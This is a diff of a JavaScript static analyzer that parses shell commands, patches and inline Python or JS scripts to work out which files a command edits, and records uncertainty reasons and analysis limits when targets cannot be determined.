+          op = "<<<";
+          j++;
+        } else {
+          op = "<<";
+          if (text[j] === "-") {
+            strip = true;
+            j++;
+          }
+        }
+      } else if (text[j] === "&") {
+        op = ">";
+        ignore = true;
+        j++;
+      } else if (text[j] === ">") {
+        j++;
+      }
+      i = j - 1;
+      pending = { op, strip, ignore };
+      continue;
+    }
+    if (!cur.started && ch === "~") cur.dyn = true;
+    if (ch === "*" || ch === "?" || ch === "[") cur.dyn = true;
+    add(ch);
+  }
+  endCommand(false);
+  readHeredocBodies(text.length);
+  return items;
+}
+
+// --- Evaluation --------------------------------------------------------------
+
+const KEYWORD_PREFIX = new Set([
+  "then",
+  "do",
+  "else",
+  "elif",
+  "if",
+  "while",
+  "until",
+  "!",
+  "{",
+  "}",
+  "time",
+]);
+
+/** Strip assignments, wrappers and reserved words ahead of the real program. */
+function stripCommandPrefix(words) {
+  let i = 0;
+  let viaXargs = false;
+  while (
+    i < words.length &&
+    (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i]) ||
+      CMD_WRAPPERS.has(words[i]) ||
+      KEYWORD_PREFIX.has(words[i]))
+  ) {
+    if (words[i] === "xargs") viaXargs = true;
+    i++;
+  }
+  return { words: words.slice(i), viaXargs };
+}
+
+function resolveCwd(cwd, dir) {
+  if (cwd === null) return path.isAbsolute(dir) ? path.resolve(dir) : null;
+  return path.resolve(cwd, dir);
+}
+
+function evalItems(items, st, depth, cwdIn) {
+  let cwd = cwdIn;
+  const stack = [];
+  for (const it of items) {
+    if (evidenceExpired(st)) return;
+    if (it.kind === "open") stack.push(cwd);
+    else if (it.kind === "close") cwd = stack.length > 0 ? stack.pop() : cwd;
+    else {
+      cwd = evalCommand(it, st, depth, cwd);
+      st.commands += 1;
+    }
+  }
+}
+
+/** Positional operands of a simple tool: non-option words (everything after `--`). */
+function operands(args) {
+  const out = [];
+  let rest = false;
+  for (const a of args) {
+    if (rest || a === "-" || !a.startsWith("-")) out.push(a);
+    else if (a === "--") rest = true;
+  }
+  return out;
+}
+
+/** `-i` in-place file operands of a sed invocation, or null when it is not in place. */
+function sedFiles(args) {
+  let inPlace = false;
+  let hasScript = false;
+  const pos = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (a === "--") {
+      pos.push(...args.slice(i + 1));
+      break;
+    }
+    if (a.startsWith("--")) {
+      if (a === "--in-place" || a.startsWith("--in-place=")) inPlace = true;
+      else if (a === "--expression" || a === "--file") {
+        hasScript = true;
+        i++;
+      } else if (a.startsWith("--expression=") || a.startsWith("--file=")) hasScript = true;
+      continue;
+    }
+    if (a.startsWith("-") && a.length > 1) {
+      for (let k = 1; k < a.length; k++) {
+        const c = a[k];
+        if (c === "i") {
+          inPlace = true;
+          break;
+        }
+        if (c === "e" || c === "f") {
+          hasScript = true;
+          if (k === a.length - 1) i++;
+          break;
+        }
+      }
+      if (a.endsWith("i") && args[i + 1] === "") i++;
+      continue;
+    }
+    pos.push(a);
+  }
+  if (!inPlace) return null;
+  if (!hasScript) pos.shift();
+  return pos;
+}
+
+/** `-i` in-place file operands of a perl or ruby invocation, or null. */
+function perlRubyFiles(args) {
+  let inPlace = false;
+  let hasScript = false;
+  const pos = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (a === "--") {
+      pos.push(...args.slice(i + 1));
+      break;
+    }
+    if (a.startsWith("-") && a.length > 1 && !a.startsWith("--")) {
+      for (let k = 1; k < a.length; k++) {
+        const c = a[k];
+        if (c === "i") {
+          inPlace = true;
+          break;
+        }
+        if (c === "e" || c === "E") {
+          hasScript = true;
+          if (k === a.length - 1) i++;
+          break;
+        }
+        if ("IMmFlx0".includes(c)) break;
       }
-      if (target.trim()) targets.push(target.trim());
+      continue;
     }
+    if (a.startsWith("--")) continue;
+    pos.push(a);
+  }
+  if (!inPlace) return null;
+  if (!hasScript) pos.shift();
+  return pos;
+}
+
+/** `-i inplace` file operands of an awk invocation, or null. */
+function awkFiles(args) {
+  let inPlace = false;
+  let hasProgram = false;
+  const pos = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (a === "-i" && args[i + 1] === "inplace") {
+      inPlace = true;
+      i++;
+    } else if (a === "-f" || a === "--file") {
+      hasProgram = true;
+      i++;
+    } else if (a === "-v" || a === "-F" || a === "-e") i++;
+    else if (a.startsWith("-") && a.length > 1) continue;
+    else pos.push(a);
   }
-  return targets;
+  if (!inPlace) return null;
+  if (!hasProgram) pos.shift();
+  return pos;
+}
+
+function evalCommand(cmd, st, depth, cwd) {
+  const { words, viaXargs } = stripCommandPrefix(cmd.words);
+  for (const target of cmd.redirects) {
+    if (cmd.dyn.has(target)) {
+      if (
+        SOURCE_EXT_RE.test(target.replace(/\u0000/g, "")) &&
+        !/^\$[A-Za-z_{][A-Za-z0-9_}]*$/.test(target)
+      ) {
+        st.uncertain.add("unresolved-target");
+      }
+    } else if (!target.startsWith("&")) addEvidenceTarget(st, target, cwd, false);
+  }
+  if (words.length === 0) return cwd;
+  const program = words[0].replace(/^.*\//, "");
+  const args = words.slice(1);
+  const inPlaceTargets = (files) => {
+    for (const f of files) addWordTarget(st, cmd, f, cwd, true);
+    if (viaXargs) st.uncertain.add("unknown-stdin");
+  };
+
+  if (cmd.dyn.has(words[0])) return cwd;
+  switch (program) {
+    case "cd": {
+      const arg = operands(args)[0];
+      if (!arg || arg === "-" || cmd.dyn.has(arg)) return null;
+      return resolveCwd(cwd, arg);
+    }
+    case "pushd":
+    case "popd":
+      return null;
+    case "tee":
+      for (const f of operands(args)) addWordTarget(st, cmd, f, cwd, false);
+      return cwd;
+    case "sed": {
+      const files = sedFiles(args);
+      if (files) inPlaceTargets(files);
+      return cwd;
+    }
+    case "perl":
+    case "ruby": {
+      const files = perlRubyFiles(args);
+      if (files) inPlaceTargets(files);
+      return cwd;
+    }
+    case "awk":
+    case "gawk": {
+      const files = awkFiles(args);
+      if (files) inPlaceTargets(files);
+      return cwd;
+    }
+    case "cp": {
+      const ops = operands(args);
+      if (
+        args.some((a) => /^-[a-zA-Z]*[rRa]/.test(a) || a === "--recursive" || a === "--archive")
+      ) {
+        st.uncertain.add("unresolved-target");
+      }
+      if (args.some((a) => a === "-t" || a.startsWith("--target-directory"))) {
+        st.uncertain.add("unresolved-target");
+      } else if (ops.length > 1) addWordTarget(st, cmd, ops[ops.length - 1], cwd, false);
+      return cwd;
+    }
+    case "mv": {
+      for (const f of operands(args)) addWordTarget(st, cmd, f, cwd, false);
+      return cwd;
+    }
+    case "bash":
+    case "sh":
+    case "zsh":
+    case "dash":
+    case "ksh": {
+      const c = args.findIndex((w) => /^-[a-z]*c$/.test(w));
+      if (c < 0 || args[c + 1] === undefined) return cwd;
+      const script = args[c + 1];
+      if (cmd.dyn.has(script)) {
+        st.uncertain.add("unknown-script-effect");
+        return cwd;
+      }
+      if (depth + 1 > EVIDENCE_LIMITS.depth) {
+        evidenceLimit(st, "depth");
+        return cwd;
+      }
+      evalItems(lexShell(script, st, depth + 1), st, depth + 1, cwd);
+      return cwd;
+    }
+    case "git":
+      if (args[0] === "apply") evalPatch(cmd, st, "git", args.slice(1), cwd);
+      return cwd;
+    case "patch":
+      evalPatch(cmd, st, "patch", args, cwd);
+      return cwd;
+    case "python":
+    case "python3":
+    case "node":
+    case "nodejs":
+      evalInterpreter(cmd, st, program.startsWith("python") ? "python" : "js", args, cwd);
+      return cwd;
+    default:
+      if (/\//.test(words[0]) && /\.(py|js|mjs|cjs)$/.test(words[0])) {
+        evalInterpreter(
+          cmd,
+          st,
+          /\.py$/.test(words[0]) ? "python" : "js",
+          [words[0], ...args],
+          cwd,
+        );
+      }
+      return cwd;
+  }
+}
+
+// --- Bounded source reads ----------------------------------------------------
+
+/** Text of a directly named regular file, or null with uncertainty / a limit recorded. */
+function readBoundedSource(st, file, cwd) {
+  if (cwd === null && !path.isAbsolute(file)) {
+    st.uncertain.add("unresolved-directory");
+    return null;
+  }
+  const max = EVIDENCE_LIMITS.sourceBytes;
+  try {
+    const abs = path.resolve(cwd === null ? path.sep : cwd, file);
+    const before = fs.lstatSync(abs);
+    if (!before.isFile()) {
+      st.uncertain.add("unavailable-source");
+      return null;
+    }
+    const fd = fs.openSync(
+      abs,
+      fs.constants.O_RDONLY | (fs.constants.O_NOFOLLOW || 0) | (fs.constants.O_NONBLOCK || 0),
+    );
+    try {
+      const after = fs.fstatSync(fd);
+      if (!after.isFile() || after.ino !== before.ino || after.dev !== before.dev) {
+        st.uncertain.add("unavailable-source");
+        return null;
+      }
+      const buf = Buffer.alloc(max + 1);
+      const n = fs.readSync(fd, buf, 0, max + 1, 0);
+      if (n > max) {
+        evidenceLimit(st, "source-size");
+        return null;
+      }
+      return buf.toString("utf8", 0, n);
+    } finally {
+      fs.closeSync(fd);
+    }
+  } catch (err) {
+    // A file that does not exist yet, named after an earlier command of the same line, is
+    // that command's output (`pnpm build && node dist/x.js`): nothing to inspect, not unknown.
+    if (!(err && err.code === "ENOENT" && st.commands > 0)) st.uncertain.add("unavailable-source");
+    return null;
+  }
+}
+
+/** The text a command reads on stdin when it is known, else null (uncertainty recorded). */
+function knownStdin(cmd, st, cwd) {
+  if (cmd.heredoc) return cmd.heredoc.body;
+  if (cmd.hereString !== null) return cmd.hereString;
+  if (cmd.stdinFile) return readBoundedSource(st, cmd.stdinFile, cwd);
+  if (cmd.piped) st.uncertain.add("unknown-stdin");
+  return null;
+}
+
+// --- Patches -----------------------------------------------------------------
+
+function stripPatchPath(p, n) {
+  if (!p || p === "/dev/null") return null;
+  const parts = p.split("/").filter((x) => x !== "");
+  if (parts.length <= n) return null;
+  return parts.slice(n).join("/");
+}
+
+/** The paths a patch text creates, deletes, moves or edits, with `-p` stripping applied. */
+function patchPaths(text, strip, st) {
+  const out = [];
+  const add = (raw, n) => {
+    if (!raw || raw === "/dev/null") return;
+    const p = stripPatchPath(raw, n);
+    if (p === null) st.uncertain.add("unresolved-target");
+    else out.push(p);
+  };
+  const lines = text.split("\n");
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    let m;
+    if ((m = /^diff --git (\S+) (\S+)\s*$/.exec(line))) {
+      add(m[1], strip);
+      add(m[2], strip);
+    } else if (line.startsWith("diff --git ")) {
+      st.uncertain.add("unresolved-target");
+    } else if ((m = /^(?:rename|copy) (?:from|to) (.+?)\s*$/.exec(line))) {
+      add(m[1], Math.max(0, strip - 1));
+    } else if (line.startsWith("--- ") && (lines[i + 1] || "").startsWith("+++ ")) {
+      add(line.slice(4).split("\t")[0].trim(), strip);
+      add(lines[i + 1].slice(4).split("\t")[0].trim(), strip);
+      i++;
+    }
+  }
+  return out;
+}
+
+function evalPatch(cmd, st, kind, args, cwd) {
+  let strip = kind === "git" ? 1 : 0;
+  let dir = null;
+  let input = null;
+  const files = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    let m;
+    if (kind === "git" && /^--(check|stat|numstat|summary)$/.test(a)) return;
+    if (kind === "patch" && (a === "--dry-run" || a === "-C" || a === "--check")) return;
+    if ((m = /^-p(\d+)$/.exec(a))) strip = Number(m[1]);
+    else if (a === "-p" && /^\d+$/.test(args[i + 1] || "")) strip = Number(args[++i]);
+    else if ((m = /^--directory=(.*)$/.exec(a))) dir = m[1];
+    else if (kind === "patch" && a === "-d") dir = args[++i] ?? null;
+    else if (kind === "patch" && (m = /^-d(.+)$/.exec(a))) dir = m[1];
+    else if (kind === "patch" && a === "-i") input = args[++i] ?? null;
+    else if (kind === "patch" && (m = /^--input=(.*)$/.exec(a))) input = m[1];
+    else if (a.startsWith("-") && a !== "-") continue;
+    else files.push(a);
+  }
+  let base = cwd;
+  if (dir !== null) base = cmd.dyn.has(dir) ? null : resolveCwd(cwd, dir);
+  const texts = [];
+  if (kind === "git") {
+    for (const f of files) {
+      if (f === "-") {
+        const t = knownStdin(cmd, st, cwd);
+        if (t !== null) texts.push(t);
+      } else if (cmd.dyn.has(f)) st.uncertain.add("unavailable-source");
+      else {
+        const t = readBoundedSource(st, f, cwd);
+        if (t !== null) texts.push(t);
+      }
+    }
+    if (files.length === 0) {
+      const t = knownStdin(cmd, st, cwd);
+      if (t !== null) texts.push(t);
+      else if (!cmd.piped) st.uncertain.add("unknown-stdin");
+    }
+  } else {
+    if (input !== null && !cmd.dyn.has(input)) {
+      const t = readBoundedSource(st, input, cwd);
+      if (t !== null) texts.push(t);
+    } else {
+      const t = knownStdin(cmd, st, cwd);
+      if (t !== null) texts.push(t);
+      else if (!cmd.piped) st.uncertain.add("unknown-stdin");
+    }
+    if (files.length > 0) {
+      for (const f of files) addWordTarget(st, cmd, f, base, true);
+      return;
+    }
+  }
+  for (const text of texts) {
+    for (const p of patchPaths(text, strip, st)) addEvidenceTarget(st, p, base, true);
+  }
+}
+
+// --- Scripts -----------------------------------------------------------------
+
+function evalInterpreter(cmd, st, lang, args, cwd) {
+  let code = null;
+  let file = null;
+  let stdin = false;
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (lang === "python") {
+      if (a === "-c") {
+        code = args[++i] ?? null;
+        break;
+      }
+      if (a === "-m") {
+        st.uncertain.add("unknown-script-effect");
+        return;
+      }
+      if (a === "-W" || a === "-X") i++;
+    } else {
+      if (a === "-e" || a === "--eval" || a === "-p" || a === "--print") {
+        code = args[++i] ?? null;
+        break;
+      }
+      if (a === "-r" || a === "--require" || a === "--import" || a.startsWith("--require=")) {
+        st.uncertain.add("unknown-script-effect");
+        return;
+      }
+    }
+    if (a === "-") {
+      stdin = true;
+      break;
+    }
+    if (a.startsWith("-") && a.length > 1) continue;
+    file = a;
+    break;
+  }
+  let source = null;
+  if (code !== null) {
+    if (cmd.dyn.has(code)) {
+      st.uncertain.add("unknown-script-effect");
+      return;
+    }
+    source = code;
+  } else if (file !== null) {
+    if (cmd.dyn.has(file)) {
+      st.uncertain.add("unavailable-source");
+      return;
+    }
+    source = readBoundedSource(st, file, cwd);
+  } else if (stdin || cmd.heredoc || cmd.stdinFile || cmd.hereString !== null || cmd.piped) {
+    source = knownStdin(cmd, st, cwd);
+  }
+  if (source === null) return;
+  const result = lang === "python" ? analyzePython(source) : analyzeJs(source);
+  for (const t of result.writes) addEvidenceTarget(st, t, cwd, true);
+  if (result.unknown) st.uncertain.add("unknown-script-effect");
 }
 
 /**
- * Detect a shell command being used as an edit channel. Returns a list of human
- * descriptions, empty when the command edits nothing.
- *
- * Quiet on `> /dev/null`, `>> "$GITHUB_ENV"`, `mktemp` handoff files and log capture.
- * Only a redirect whose target both looks like a repo path AND carries a source
- * extension is reported.
+ * Tokens of a Python or JS source: `{ k: "id"|"str"|"dstr"|"num"|"p"|"nl", v }`, or null
+ * when the text cannot be tokenized. `dstr` is a string that is not a plain literal.
  */
-function shellEditTargets(cmd) {
-  const hits = [];
-  const lines = commandLines(cmd);
-  for (const line of lines) {
-    const words = commandWords(line);
-    const program = commandProgram(words);
-    const args = words.slice(1);
-    if ((program === "sed" || program === "perl") && args.some((w) => /^-i(?:\..*)?$/.test(w))) {
-      hits.push("in-place sed/perl (-i)");
+function tokenizeSource(src, lang) {
+  const out = [];
+  let depth = 0;
+  const n = src.length;
+  for (let i = 0; i < n; i++) {
+    const ch = src[i];
+    if (ch === "\n") {
+      if (depth === 0) out.push({ k: "nl", v: "\n" });
+      if (lang === "python" && depth === 0) {
+        let j = i + 1;
+        while (src[j] === " " || src[j] === "\t") j++;
+        if (j > i + 1 && src[j] !== "\n" && src[j] !== "#" && j < n) return null;
+      }
+      continue;
     }
-    if (program === "awk" && args.some((w, i) => w === "-i" && args[i + 1] === "inplace")) {
-      hits.push("awk -i inplace");
+    if (/\s/.test(ch)) continue;
+    if (lang === "python" && ch === "#") {
+      while (i < n && src[i] !== "\n") i++;
+      i--;
+      continue;
     }
+    if (lang === "js" && ch === "/" && src[i + 1] === "/") {
+      while (i < n && src[i] !== "\n") i++;
+      i--;
+      continue;
+    }
+    if (lang === "js" && ch === "/" && src[i + 1] === "*") {
+      const end = src.indexOf("*/", i + 2);
+      if (end < 0) return null;
+      i = end + 1;
+      continue;
+    }
+    if (lang === "python" && ch === "\\" && src[i + 1] === "\n") {
+      i++;
+      continue;
+    }
+    const prefix = lang === "python" ? /^[rRbBuUfF]{1,2}(?=['"])/.exec(src.slice(i, i + 3)) : null;
+    const q = prefix ? src[i + prefix[0].length] : ch;
+    if (q === "'" || q === '"' || (lang === "js" && q === "`")) {
+      const start = i + (prefix ? prefix[0].length : 0);
+      const triple = lang === "python" && src.startsWith(q.repeat(3), start);
+      const open = triple ? 3 : 1;
+      let j = start + open;
+      let body = "";
+      let plain = !(prefix && /[fF]/.test(prefix[0]));
+      for (; j < n; j++) {
+        const c = src[j];
+        if (c === "\\") {
+          plain = false;
+          j++;
+          continue;
+        }
+        if (triple ? src.startsWith(q.repeat(3), j) : c === q) break;
+        if (c === "\n" && !triple && q !== "`") return null;
+        if (q === "`" && c === "$" && src[j + 1] === "{") plain = false;
+        if (prefix && /[fF]/.test(prefix[0]) && (c === "{" || c === "}")) plain = false;
+        body += c;
+      }
+      if (j >= n) return null;
+      out.push({ k: plain ? "str" : "dstr", v: body });
+      i = j + open - 1;
+      continue;
+    }
+    if (/[0-9]/.test(ch)) {
+      while (i + 1 < n && /[0-9A-Za-z_.]/.test(src[i + 1])) i++;
+      out.push({ k: "num", v: "0" });
+      continue;
+    }
+    const idStart = lang === "js" ? /[A-Za-z_$]/ : /[A-Za-z_]/;
+    if (idStart.test(ch)) {
+      let j = i;
+      while (j + 1 < n && (lang === "js" ? /[A-Za-z0-9_$]/ : /[A-Za-z0-9_]/).test(src[j + 1])) j++;
+      out.push({ k: "id", v: src.slice(i, j + 1) });
+      i = j;
+      continue;
+    }
+    if ("([{".includes(ch)) depth++;
+    if (")]}".includes(ch)) depth = Math.max(0, depth - 1);
+    if ("()[]{},.:;=+-*/%<>!&|^~?".includes(ch)) {
+      out.push({ k: "p", v: ch });
+      continue;
+    }
+    return null;
+  }
+  return out;
+}
+
+function splitStatements(tokens) {
+  const stmts = [];
+  let cur = [];
+  for (const t of tokens) {
+    if (t.k === "nl" || (t.k === "p" && t.v === ";")) {
+      if (cur.length) stmts.push(cur);
+      cur = [];
+    } else cur.push(t);
   }
-  for (const text of [String(cmd), ...lines]) {
-    for (const target of redirectTargets(text)) {
-      // Scratch and env sinks — never a source edit.
-      if (target.startsWith("$") || target.startsWith("&")) continue;
-      if (/^\/(dev|tmp|var\/folders|var\/tmp)\//.test(target)) continue;
-      if (/\.(log|bak|tmp|out|err|orig)$/i.test(target)) continue;
-      if (!SOURCE_EXT_RE.test(target)) continue;
-      hits.push(`redirect into ${target}`);
+  if (cur.length) stmts.push(cur);
+  return stmts;
+}
+
+const PY_SAFE_MODULES = new Set([
+  "os",
+  "sys",
+  "json",
+  "re",
+  "math",
+  "pathlib",
+  "time",
+  "datetime",
+  "collections",
+  "itertools",
+  "functools",
+  "string",
+  "textwrap",
+  "base64",
+  "hashlib",
+  "typing",
+]);
+const PY_BUILTINS = new Set([
+  "print",
+  "len",
+  "str",
+  "int",
+  "float",
+  "bool",
+  "abs",
+  "min",
+  "max",
+  "sum",
+  "sorted",
+  "list",
+  "dict",
+  "set",
+  "tuple",
+  "repr",
+  "range",
+  "enumerate",
+  "zip",
+  "reversed",
+]);
+const PY_EXPR_WORDS = new Set([
+  "and",
+  "or",
+  "not",
+  "in",
+  "is",
+  "if",
+  "else",
+  "True",
+  "False",
+  "None",
+]);
+const PY_STATEMENT_WORDS = new Set([
+  "for",
+  "while",
+  "if",
+  "def",
+  "class",
+  "with",
+  "try",
+  "lambda",
+  "return",
+  "del",
+  "global",
+  "nonlocal",
+  "async",
+  "await",
+  "raise",
+  "assert",
+  "yield",
+  "break",
+  "continue",
+  "elif",
+  "else",
+  "except",
+  "finally",
+  "exec",
+  "pass",
+]);
+const PY_ATTR_OK = new Set([
+  "read",
+  "readlines",
+  "readline",
+  "write",
+  "close",
+  "strip",
+  "lstrip",
+  "rstrip",
+  "split",
+  "splitlines",
+  "join",
+  "format",
+  "upper",
+  "lower",
+  "startswith",
+  "endswith",
+  "find",
+  "count",
+  "encode",
+  "decode",
+  "get",
+  "keys",
+  "values",
+  "items",
+  "append",
+  "environ",
+  "path",
+  "argv",
+  "stdout",
+  "stderr",
+  "exit",
+  "loads",
+  "dumps",
+  "load",
+  "match",
+  "search",
+  "findall",
+  "sub",
+  "sqrt",
+  "floor",
+  "ceil",
+  "pi",
+  "now",
+  "today",
+  "strftime",
+  "isoformat",
+  "sha256",
+  "hexdigest",
+  "b64encode",
+  "b64decode",
+  "Path",
+  "title",
+  "capitalize",
+  "index",
+  "extend",
+]);
+const PY_OS_OK = new Set([
+  "environ",
+  "path",
+  "getcwd",
+  "listdir",
+  "getenv",
+  "sep",
+  "linesep",
+  "name",
+  "getpid",
+]);
+
+/** Python source effects: literal write targets plus whether anything is unrecognized. */
+function analyzePython(src) {
+  const tokens = tokenizeSource(src, "python");
+  if (!tokens) return { writes: [], unknown: true };
+  const writes = [];
+  const recognized = new Set();
+  let unknown = false;
+  for (let i = 0; i < tokens.length; i++) {
+    const t = tokens[i];
+    if (t.k === "id" && t.v === "open" && tokens[i - 1]?.v !== ".") {
+      const ok =
+        tokens[i + 1]?.v === "(" &&
+        tokens[i + 2]?.k === "str" &&
+        (tokens[i + 3]?.v === ")" ||
+          (tokens[i + 3]?.v === "," && tokens[i + 4]?.k === "str" && tokens[i + 5]?.v === ")"));
+      if (ok) {
+        recognized.add(i);
+        const mode = tokens[i + 3]?.v === "," ? tokens[i + 4].v : "r";
+        if (/[wax+]/.test(mode)) writes.push(tokens[i + 2].v);
+      }
+    }
+    if (
+      t.k === "id" &&
+      (t.v === "write_text" || t.v === "write_bytes") &&
+      tokens[i - 1]?.v === "." &&
+      tokens[i - 2]?.v === ")" &&
+      tokens[i - 3]?.k === "str" &&
+      tokens[i - 4]?.v === "(" &&
+      tokens[i - 5]?.v === "Path"
+    ) {
+      recognized.add(i);
+      writes.push(tokens[i - 3].v);
     }
   }
-  return [...new Set(hits)];
+  const bound = new Set();
+  for (const stmt of splitStatements(tokens)) {
+    const first = stmt[0];
+    if (first.k === "id" && (first.v === "import" || first.v === "from")) {
+      const names = [];
+      let i = 1;
+      let moduleRoot = null;
+      if (first.v === "from") {
+        moduleRoot = stmt[1]?.v;
+        if (stmt[2]?.v !== "import" || !moduleRoot) unknown = true;
+        i = 3;
+      }
+      if (first.v === "import" || !unknown) {
+        for (; i < stmt.length; i++) {
+          const t = stmt[i];
+          if (t.k === "id" && t.v !== "as") {
+            const aliased = stmt[i + 1]?.v === "as" && stmt[i + 2]?.k === "id";
+            const rootName = first.v === "import" ? t.v : moduleRoot;
+            if (!PY_SAFE_MODULES.has(rootName)) unknown = true;
+            names.push(aliased ? stmt[i + 2].v : t.v);
+            if (aliased) i += 2;
+            while (stmt[i + 1]?.v === "." && stmt[i + 2]?.k === "id") i += 2;
+          } else if (t.k === "p" && t.v === "*") unknown = true;
+        }
+      }
+      for (const nme of names) bound.add(nme);
+      continue;
+    }
+    if (first.k === "id" && PY_STATEMENT_WORDS.has(first.v) && !(first.v === "pass")) {
+      unknown = true;
+      continue;
+    }
+    let start = 0;
+    let bindName = null;
+    if (
+      first.k === "id" &&
+      stmt[1]?.v === "=" &&
+      stmt[2]?.v !== "=" &&
+      !PY_EXPR_WORDS.has(first.v)
+    ) {
+      bindName = first.v;
+      start = 2;
+    }
+    for (let j = start; j < stmt.length; j++) {
+      const t = stmt[j];
+      if (t.k === "dstr") {
+        unknown = true;
+        continue;
+      }
+      if (t.k !== "id") continue;
+      const prev = stmt[j - 1];
+      if (prev && prev.k === "p" && prev.v === ".") {
+        const recv = stmt[j - 2];
+        const viaPath = recv?.v === "path" && stmt[j - 3]?.v === ".";
+        if (recv?.v === "os" && bound.has("os")) {
+          if (!PY_OS_OK.has(t.v)) unknown = true;
+        } else if (!viaPath && !PY_ATTR_OK.has(t.v) && !recognized.has(tokens.indexOf(t)))
+          unknown = true;
+        continue;
+      }
+      if (t.v === "open") {
+        if (!recognized.has(tokens.indexOf(t))) unknown = true;
+        continue;
+      }
+      if (PY_EXPR_WORDS.has(t.v) || PY_BUILTINS.has(t.v) || bound.has(t.v)) continue;
+      unknown = true;
+    }
+    if (bindName) bound.add(bindName);
+  }
+  return { writes, unknown };
+}
+
+const JS_GLOBALS = new Set([
+  "console",
+  "JSON",
+  "Math",
+  "Number",
+  "String",
+  "Boolean",
+  "Array",
+  "Object",
+  "process",
+  "require",
+  "true",
+  "false",
+  "null",
+  "undefined",
+  "NaN",
+  "Infinity",
+  "typeof",
+]);
+const JS_SAFE_MODULES = new Set([
+  "fs",
+  "node:fs",
+  "path",
+  "node:path",
+  "os",
+  "node:os",
+  "util",
+  "node:util",
+  "fs/promises",
+  "node:fs/promises",
+]);
+const JS_STATEMENT_WORDS = new Set([
+  "if",
+  "for",
+  "while",
+  "do",
+  "switch",
+  "function",
+  "class",
+  "try",
+  "return",
+  "throw",
+  "async",
+  "await",
+  "import",
+  "export",
+  "delete",
+  "with",
+  "new",
+  "else",
+  "case",
+  "break",
+  "continue",
+  "catch",
+  "finally",
+]);
+const JS_ATTR_OK = new Set([
+  "log",
+  "error",
+  "warn",
+  "info",
+  "stringify",
+  "parse",
+  "readFileSync",
+  "readFile",
+  "existsSync",
+  "readdirSync",
+  "statSync",
+  "lstatSync",
+  "join",
+  "resolve",
+  "basename",
+  "dirname",
+  "extname",
+  "relative",
+  "toString",
+  "trim",
+  "split",
+  "length",
+  "slice",
+  "push",
+  "includes",
+  "indexOf",
+  "startsWith",
+  "endsWith",
+  "replace",
+  "toUpperCase",
+  "toLowerCase",
+  "keys",
+  "values",
+  "entries",
+  "env",
+  "argv",
+  "cwd",
+  "stdout",
+  "stderr",
+  "write",
+  "platform",
+  "sep",
+  "floor",
+  "ceil",
+  "round",
+  "max",
+  "min",
+  "abs",
+  "isArray",
+  "promises",
+  "mkdirSync",
+  "mkdir",
+  "exit",
+  "sort",
+  "reverse",
+]);
+const JS_WRITE_ONE = new Set([
+  "writeFileSync",
+  "writeFile",
+  "appendFileSync",
+  "appendFile",
+  "createWriteStream",
+  "unlinkSync",
+  "unlink",
+  "rmSync",
+  "rm",
+]);
+const JS_WRITE_DEST = new Set(["copyFileSync", "copyFile"]);
+const JS_WRITE_TWO = new Set(["renameSync", "rename"]);
+
+/** JavaScript source effects, on the same terms as `analyzePython`. */
+function analyzeJs(src) {
+  const tokens = tokenizeSource(src, "js");
+  if (!tokens) return { writes: [], unknown: true };
+  const writes = [];
+  const recognized = new Set();
+  let unknown = false;
+  for (let i = 0; i < tokens.length; i++) {
+    const t = tokens[i];
+    if (t.k !== "id" || tokens[i + 1]?.v !== "(") continue;
+    const arg1 = tokens[i + 2];
+    const arg2 = tokens[i + 4];
+    if (JS_WRITE_ONE.has(t.v) && arg1?.k === "str") {
+      recognized.add(i);
+      writes.push(arg1.v);
+    } else if (
+      JS_WRITE_DEST.has(t.v) &&
+      arg1?.k === "str" &&
+      tokens[i + 3]?.v === "," &&
+      arg2?.k === "str"
+    ) {
+      recognized.add(i);
+      writes.push(arg2.v);
+    } else if (
+      JS_WRITE_TWO.has(t.v) &&
+      arg1?.k === "str" &&
+      tokens[i + 3]?.v === "," &&
+      arg2?.k === "str"
+    ) {
+      recognized.add(i);
+      writes.push(arg1.v, arg2.v);
+    }
+  }
+  const bound = new Set();
+  for (const stmt of splitStatements(tokens)) {
+    const first = stmt[0];
+    let start = 0;
+    if (first.k === "id" && ["const", "let", "var"].includes(first.v)) {
+      start = 1;
+      if (stmt[1]?.k === "id") bound.add(stmt[1].v);
+      else if (stmt[1]?.v === "{") {
+        for (let j = 2; j < stmt.length && stmt[j].v !== "}"; j++)
+          if (stmt[j].k === "id") bound.add(stmt[j].v);
+      }
+    } else if (first.k === "id" && JS_STATEMENT_WORDS.has(first.v)) {
+      unknown = true;
+      continue;
+    }
+    for (let j = start; j < stmt.length; j++) {
+      const t = stmt[j];
+      if (t.k === "dstr") {
+        unknown = true;
+        continue;
+      }
+      if (t.k !== "id") continue;
+      const idx = tokens.indexOf(t);
+      if (stmt[j - 1]?.v === ".") {
+        if (!JS_ATTR_OK.has(t.v) && !recognized.has(idx)) unknown = true;
+        continue;
+      }
+      if (recognized.has(idx)) continue;
+      if (t.v === "require") {
+        const mod = stmt[j + 2];
+        if (stmt[j + 1]?.v !== "(" || mod?.k !== "str" || !JS_SAFE_MODULES.has(mod.v))
+          unknown = true;
+        continue;
+      }
+      if (JS_GLOBALS.has(t.v) || bound.has(t.v)) continue;
+      unknown = true;
+    }
+  }
+  return { writes, unknown };
+}
+
+const EVIDENCE_REASONS = {
+  "unresolved-directory": "the working directory is not a literal path",
+  "unresolved-target": "a target path is computed or not literal",
+  "unknown-script-effect": "a script has effects that were not recognized",
+  "unavailable-source": "a named source file could not be safely read",
+  "unknown-stdin": "its input is not a literal patch or script",
+};
+const LIMIT_REASONS = {
+  "command-size": "the command is longer than 256 KiB",
+  "source-size": "a source file is larger than 64 KiB",
+  depth: "nesting is deeper than 3 levels",
+  "target-count": "more than 64 targets",
+  deadline: "analysis took longer than 200 ms",
+};
+
+/**
+ * Edit evidence for a shell command: `{ targets, uncertain, limit }`.
+ * `targets` are ordered unique paths (workspace-relative where inside it), `uncertain` lists
+ * reason codes for effects whose targets cannot be determined, and `limit` is the first
+ * analysis limit reached (analysis stopped there and kept the earlier targets). A command that
+ * edits nothing returns empty `targets` and `uncertain` and a null `limit`.
+ *
+ * Quiet on `> /dev/null`, `>> "$GITHUB_ENV"`, `mktemp` handoff files and log capture.
+ * `ctx` is `{ cwd, root }` (`hookContext`).
+ */
+function shellEditTargets(cmd, ctx) {
